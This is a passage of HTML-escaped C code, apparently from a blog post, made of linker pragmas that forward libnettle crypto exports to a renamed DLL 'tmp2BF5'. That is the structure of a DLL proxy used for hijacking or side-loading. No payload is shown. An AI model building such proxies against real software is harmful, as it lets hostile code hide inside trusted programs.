&quot;&#x2F;export:nettle_gcm_aes256_digest&#x3D;tmp2BF5.nettle_gcm_aes256_digest,@258&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256_encrypt&#x3D;tmp2BF5.nettle_gcm_aes256_encrypt,@259&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256_set_iv&#x3D;tmp2BF5.nettle_gcm_aes256_set_iv,@260&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256_set_key&#x3D;tmp2BF5.nettle_gcm_aes256_set_key,@261&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256_update&#x3D;tmp2BF5.nettle_gcm_aes256_update,@262&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes_decrypt&#x3D;tmp2BF5.nettle_gcm_aes_decrypt,@263&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes_digest&#x3D;tmp2BF5.nettle_gcm_aes_digest,@264&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes_encrypt&#x3D;tmp2BF5.nettle_gcm_aes_encrypt,@265&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes_set_iv&#x3D;tmp2BF5.nettle_gcm_aes_set_iv,@266&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes_set_key&#x3D;tmp2BF5.nettle_gcm_aes_set_key,@267&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes_update&#x3D;tmp2BF5.nettle_gcm_aes_update,@268&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128&#x3D;tmp2BF5.nettle_gcm_camellia128,@269&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128_decrypt&#x3D;tmp2BF5.nettle_gcm_camellia128_decrypt,@270&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128_digest&#x3D;tmp2BF5.nettle_gcm_camellia128_digest,@271&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128_encrypt&#x3D;tmp2BF5.nettle_gcm_camellia128_encrypt,@272&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128_set_iv&#x3D;tmp2BF5.nettle_gcm_camellia128_set_iv,@273&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128_set_key&#x3D;tmp2BF5.nettle_gcm_camellia128_set_key,@274&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128_update&#x3D;tmp2BF5.nettle_gcm_camellia128_update,@275&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256&#x3D;tmp2BF5.nettle_gcm_camellia256,@276&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256_decrypt&#x3D;tmp2BF5.nettle_gcm_camellia256_decrypt,@277&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256_digest&#x3D;tmp2BF5.nettle_gcm_camellia256_digest,@278&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256_encrypt&#x3D;tmp2BF5.nettle_gcm_camellia256_encrypt,@279&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256_set_iv&#x3D;tmp2BF5.nettle_gcm_camellia256_set_iv,@280&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256_set_key&#x3D;tmp2BF5.nettle_gcm_camellia256_set_key,@281&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256_update&#x3D;tmp2BF5.nettle_gcm_camellia256_update,@282&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_decrypt&#x3D;tmp2BF5.nettle_gcm_decrypt,@283&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_digest&#x3D;tmp2BF5.nettle_gcm_digest,@284&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_encrypt&#x3D;tmp2BF5.nettle_gcm_encrypt,@285&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_set_iv&#x3D;tmp2BF5.nettle_gcm_set_iv,@286&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_set_key&#x3D;tmp2BF5.nettle_gcm_set_key,@287&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_update&#x3D;tmp2BF5.nettle_gcm_update,@288&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_get_aeads&#x3D;tmp2BF5.nettle_get_aeads,@289&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_get_armors&#x3D;tmp2BF5.nettle_get_armors,@290&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_get_ciphers&#x3D;tmp2BF5.nettle_get_ciphers,@291&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_get_hashes&#x3D;tmp2BF5.nettle_get_hashes,@292&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_get_macs&#x3D;tmp2BF5.nettle_get_macs,@293&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94&#x3D;tmp2BF5.nettle_gosthash94,@294&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94_digest&#x3D;tmp2BF5.nettle_gosthash94_digest,@295&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94_init&#x3D;tmp2BF5.nettle_gosthash94_init,@296&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94_update&#x3D;tmp2BF5.nettle_gosthash94_update,@297&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94cp&#x3D;tmp2BF5.nettle_gosthash94cp,@298&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94cp_digest&#x3D;tmp2BF5.nettle_gosthash94cp_digest,@299&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94cp_update&#x3D;tmp2BF5.nettle_gosthash94cp_update,@300&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hkdf_expand&#x3D;tmp2BF5.nettle_hkdf_expand,@301&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hkdf_extract&#x3D;tmp2BF5.nettle_hkdf_extract,@302&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_digest&#x3D;tmp2BF5.nettle_hmac_digest,@303&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_gosthash94_digest&#x3D;tmp2BF5.nettle_hmac_gosthash94_digest,@304&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_gosthash94_set_key&#x3D;tmp2BF5.nettle_hmac_gosthash94_set_key,@305&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_gosthash94_update&#x3D;tmp2BF5.nettle_hmac_gosthash94_update,@306&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_gosthash94cp_digest&#x3D;tmp2BF5.nettle_hmac_gosthash94cp_digest,@307&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_gosthash94cp_set_key&#x3D;tmp2BF5.nettle_hmac_gosthash94cp_set_key,@308&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_gosthash94cp_update&#x3D;tmp2BF5.nettle_hmac_gosthash94cp_update,@309&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_md5&#x3D;tmp2BF5.nettle_hmac_md5,@310&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_md5_digest&#x3D;tmp2BF5.nettle_hmac_md5_digest,@311&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_md5_set_key&#x3D;tmp2BF5.nettle_hmac_md5_set_key,@312&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_md5_update&#x3D;tmp2BF5.nettle_hmac_md5_update,@313&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_ripemd160&#x3D;tmp2BF5.nettle_hmac_ripemd160,@314&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_ripemd160_digest&#x3D;tmp2BF5.nettle_hmac_ripemd160_digest,@315&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_ripemd160_set_key&#x3D;tmp2BF5.nettle_hmac_ripemd160_set_key,@316&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_ripemd160_update&#x3D;tmp2BF5.nettle_hmac_ripemd160_update,@317&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_set_key&#x3D;tmp2BF5.nettle_hmac_set_key,@318&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha1&#x3D;tmp2BF5.nettle_hmac_sha1,@319&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha1_digest&#x3D;tmp2BF5.nettle_hmac_sha1_digest,@320&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha1_set_key&#x3D;tmp2BF5.nettle_hmac_sha1_set_key,@321&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha1_update&#x3D;tmp2BF5.nettle_hmac_sha1_update,@322&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha224&#x3D;tmp2BF5.nettle_hmac_sha224,@323&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha224_digest&#x3D;tmp2BF5.nettle_hmac_sha224_digest,@324&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha224_set_key&#x3D;tmp2BF5.nettle_hmac_sha224_set_key,@325&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha256&#x3D;tmp2BF5.nettle_hmac_sha256,@326&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha256_digest&#x3D;tmp2BF5.nettle_hmac_sha256_digest,@327&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha256_set_key&#x3D;tmp2BF5.nettle_hmac_sha256_set_key,@328&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha256_update&#x3D;tmp2BF5.nettle_hmac_sha256_update,@329&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha384&#x3D;tmp2BF5.nettle_hmac_sha384,@330&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha384_digest&#x3D;tmp2BF5.nettle_hmac_sha384_digest,@331&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha384_set_key&#x3D;tmp2BF5.nettle_hmac_sha384_set_key,@332&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha512&#x3D;tmp2BF5.nettle_hmac_sha512,@333&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha512_digest&#x3D;tmp2BF5.nettle_hmac_sha512_digest,@334&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha512_set_key&#x3D;tmp2BF5.nettle_hmac_sha512_set_key,@335&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha512_update&#x3D;tmp2BF5.nettle_hmac_sha512_update,@336&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_update&#x3D;tmp2BF5.nettle_hmac_update,@337&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_knuth_lfib_get&#x3D;tmp2BF5.nettle_knuth_lfib_get,@338&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_knuth_lfib_get_array&#x3D;tmp2BF5.nettle_knuth_lfib_get_array,@339&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_knuth_lfib_init&#x3D;tmp2BF5.nettle_knuth_lfib_init,@340&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_knuth_lfib_random&#x3D;tmp2BF5.nettle_knuth_lfib_random,@341&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_lookup_hash&#x3D;tmp2BF5.nettle_lookup_hash,@342&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md2&#x3D;tmp2BF5.nettle_md2,@343&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md2_digest&#x3D;tmp2BF5.nettle_md2_digest,@344&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md2_init&#x3D;tmp2BF5.nettle_md2_init,@345&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md2_update&#x3D;tmp2BF5.nettle_md2_update,@346&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md4&#x3D;tmp2BF5.nettle_md4,@347&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md4_digest&#x3D;tmp2BF5.nettle_md4_digest,@348&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md4_init&#x3D;tmp2BF5.nettle_md4_init,@349&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md4_update&#x3D;tmp2BF5.nettle_md4_update,@350&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md5&#x3D;tmp2BF5.nettle_md5,@351&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md5_compress&#x3D;tmp2BF5.nettle_md5_compress,@352&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md5_digest&#x3D;tmp2BF5.nettle_md5_digest,@353&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md5_init&#x3D;tmp2BF5.nettle_md5_init,@354&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md5_update&#x3D;tmp2BF5.nettle_md5_update,@355&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_memeql_sec&#x3D;tmp2BF5.nettle_memeql_sec,@356&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_memxor&#x3D;tmp2BF5.nettle_memxor,@357&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_memxor3&#x3D;tmp2BF5.nettle_memxor3,@358&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_pbkdf2&#x3D;tmp2BF5.nettle_pbkdf2,@359&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_pbkdf2_hmac_gosthash94cp&#x3D;tmp2BF5.nettle_pbkdf2_hmac_gosthash94cp,@360&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_pbkdf2_hmac_sha1&#x3D;tmp2BF5.nettle_pbkdf2_hmac_sha1,@361&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_pbkdf2_hmac_sha256&#x3D;tmp2BF5.nettle_pbkdf2_hmac_sha256,@362&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_poly1305_aes_digest&#x3D;tmp2BF5.nettle_poly1305_aes_digest,@363&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_poly1305_aes_set_key&#x3D;tmp2BF5.nettle_poly1305_aes_set_key,@364&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_poly1305_aes_set_nonce&#x3D;tmp2BF5.nettle_poly1305_aes_set_nonce,@365&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_poly1305_aes_update&#x3D;tmp2BF5.nettle_poly1305_aes_update,@366&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_realloc&#x3D;tmp2BF5.nettle_realloc,@367&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ripemd160&#x3D;tmp2BF5.nettle_ripemd160,@368&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ripemd160_digest&#x3D;tmp2BF5.nettle_ripemd160_digest,@369&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ripemd160_init&#x3D;tmp2BF5.nettle_ripemd160_init,@370&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ripemd160_update&#x3D;tmp2BF5.nettle_ripemd160_update,@371&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_salsa20_128_set_key&#x3D;tmp2BF5.nettle_salsa20_128_set_key,@372&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_salsa20_256_set_key&#x3D;tmp2BF5.nettle_salsa20_256_set_key,@373&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_salsa20_crypt&#x3D;tmp2BF5.nettle_salsa20_crypt,@374&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_salsa20_set_key&#x3D;tmp2BF5.nettle_salsa20_set_key,@375&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_salsa20_set_nonce&#x3D;tmp2BF5.nettle_salsa20_set_nonce,@376&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_salsa20r12_crypt&#x3D;tmp2BF5.nettle_salsa20r12_crypt,@377&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent128&#x3D;tmp2BF5.nettle_serpent128,@378&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent128_set_key&#x3D;tmp2BF5.nettle_serpent128_set_key,@379&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent192&#x3D;tmp2BF5.nettle_serpent192,@380&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent192_set_key&#x3D;tmp2BF5.nettle_serpent192_set_key,@381&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent256&#x3D;tmp2BF5.nettle_serpent256,@382&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent256_set_key&#x3D;tmp2BF5.nettle_serpent256_set_key,@383&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent_decrypt&#x3D;tmp2BF5.nettle_serpent_decrypt,@384&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent_encrypt&#x3D;tmp2BF5.nettle_serpent_encrypt,@385&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent_set_key&#x3D;tmp2BF5.nettle_serpent_set_key,@386&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha1&#x3D;tmp2BF5.nettle_sha1,@387&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha1_compress&#x3D;tmp2BF5.nettle_sha1_compress,@388&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha1_digest&#x3D;tmp2BF5.nettle_sha1_digest,@389&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha1_init&#x3D;tmp2BF5.nettle_sha1_init,@390&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha1_update&#x3D;tmp2BF5.nettle_sha1_update,@391&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha224&#x3D;tmp2BF5.nettle_sha224,@392&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha224_digest&#x3D;tmp2BF5.nettle_sha224_digest,@393&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha224_init&#x3D;tmp2BF5.nettle_sha224_init,@394&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha256&#x3D;tmp2BF5.nettle_sha256,@395&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha256_digest&#x3D;tmp2BF5.nettle_sha256_digest,@396&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha256_init&#x3D;tmp2BF5.nettle_sha256_init,@397&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha256_update&#x3D;tmp2BF5.nettle_sha256_update,@398&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha384&#x3D;tmp2BF5.nettle_sha384,@399&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha384_digest&#x3D;tmp2BF5.nettle_sha384_digest,@400&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha384_init&#x3D;tmp2BF5.nettle_sha384_init,@401&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_224&#x3D;tmp2BF5.nettle_sha3_224,@402&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_224_digest&#x3D;tmp2BF5.nettle_sha3_224_digest,@403&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_224_init&#x3D;tmp2BF5.nettle_sha3_224_init,@404&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_224_update&#x3D;tmp2BF5.nettle_sha3_224_update,@405&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_256&#x3D;tmp2BF5.nettle_sha3_256,@406&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_256_digest&#x3D;tmp2BF5.nettle_sha3_256_digest,@407&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_256_init&#x3D;tmp2BF5.nettle_sha3_256_init,@408&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_256_shake&#x3D;tmp2BF5.nettle_sha3_256_shake,@409&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_256_update&#x3D;tmp2BF5.nettle_sha3_256_update,@410&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_384&#x3D;tmp2BF5.nettle_sha3_384,@411&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_384_digest&#x3D;tmp2BF5.nettle_sha3_384_digest,@412&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_384_init&#x3D;tmp2BF5.nettle_sha3_384_init,@413&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_384_update&#x3D;tmp2BF5.nettle_sha3_384_update,@414&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_512&#x3D;tmp2BF5.nettle_sha3_512,@415&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_512_digest&#x3D;tmp2BF5.nettle_sha3_512_digest,@416&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_512_init&#x3D;tmp2BF5.nettle_sha3_512_init,@417&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_512_update&#x3D;tmp2BF5.nettle_sha3_512_update,@418&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_permute&#x3D;tmp2BF5.nettle_sha3_permute,@419&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512&#x3D;tmp2BF5.nettle_sha512,@420&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_224&#x3D;tmp2BF5.nettle_sha512_224,@421&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_224_digest&#x3D;tmp2BF5.nettle_sha512_224_digest,@422&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_224_init&#x3D;tmp2BF5.nettle_sha512_224_init,@423&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_256&#x3D;tmp2BF5.nettle_sha512_256,@424&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_256_digest&#x3D;tmp2BF5.nettle_sha512_256_digest,@425&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_256_init&#x3D;tmp2BF5.nettle_sha512_256_init,@426&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_digest&#x3D;tmp2BF5.nettle_sha512_digest,@427&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_init&#x3D;tmp2BF5.nettle_sha512_init,@428&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_update&#x3D;tmp2BF5.nettle_sha512_update,@429&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_aes128_decrypt_message&#x3D;tmp2BF5.nettle_siv_cmac_aes128_decrypt_message,@430&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_aes128_encrypt_message&#x3D;tmp2BF5.nettle_siv_cmac_aes128_encrypt_message,@431&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_aes128_set_key&#x3D;tmp2BF5.nettle_siv_cmac_aes128_set_key,@432&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_aes256_decrypt_message&#x3D;tmp2BF5.nettle_siv_cmac_aes256_decrypt_message,@433&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_aes256_encrypt_message&#x3D;tmp2BF5.nettle_siv_cmac_aes256_encrypt_message,@434&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_aes256_set_key&#x3D;tmp2BF5.nettle_siv_cmac_aes256_set_key,@435&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_decrypt_message&#x3D;tmp2BF5.nettle_siv_cmac_decrypt_message,@436&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_encrypt_message&#x3D;tmp2BF5.nettle_siv_cmac_encrypt_message,@437&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_set_key&#x3D;tmp2BF5.nettle_siv_cmac_set_key,@438&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish128&#x3D;tmp2BF5.nettle_twofish128,@439&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish128_set_key&#x3D;tmp2BF5.nettle_twofish128_set_key,@440&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish192&#x3D;tmp2BF5.nettle_twofish192,@441&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish192_set_key&#x3D;tmp2BF5.nettle_twofish192_set_key,@442&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish256&#x3D;tmp2BF5.nettle_twofish256,@443&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish256_set_key&#x3D;tmp2BF5.nettle_twofish256_set_key,@444&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish_decrypt&#x3D;tmp2BF5.nettle_twofish_decrypt,@445&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish_encrypt&#x3D;tmp2BF5.nettle_twofish_encrypt,@446&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish_set_key&#x3D;tmp2BF5.nettle_twofish_set_key,@447&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac128_digest&#x3D;tmp2BF5.nettle_umac128_digest,@448&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac128_set_key&#x3D;tmp2BF5.nettle_umac128_set_key,@449&quot;)</span><br><span 